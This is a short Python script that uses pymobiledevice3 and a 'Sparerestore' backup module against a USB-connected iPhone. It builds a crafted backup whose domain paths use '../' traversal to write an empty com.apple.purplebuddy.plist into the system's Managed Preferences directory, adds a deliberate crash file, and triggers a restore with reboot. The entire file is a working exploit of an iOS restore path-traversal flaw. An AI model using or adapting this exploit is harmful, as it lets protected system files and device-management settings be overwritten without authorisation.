from Sparerestore import backup, perform_restore
from pymobiledevice3 import usbmux
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.lockdown import LockdownClient

lockdown = None
while lockdown == None:
    connected_devices = usbmux.list_devices()
    # Connect via usbmuxd
    for current_device in connected_devices:
        if current_device.is_usb:
            lockdown = create_using_usbmux(serial=current_device.serial)
    
    if lockdown == None:
        print("Please connect your device and try again!")
        input("Press Enter to continue...")

restore_path = "/var/Managed Preferences/mobile/"
restore_name = "com.apple.purplebuddy.plist"
back = backup.Backup(files=[
        backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup{restore_path}",
                owner=501,
                group=501
            ),
        backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup{restore_path}{restore_name}",
                owner=501,
                group=501,
                contents=b""
            ),
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ])

perform_restore(backup=back, reboot=True, lockdown_client=lockdown)
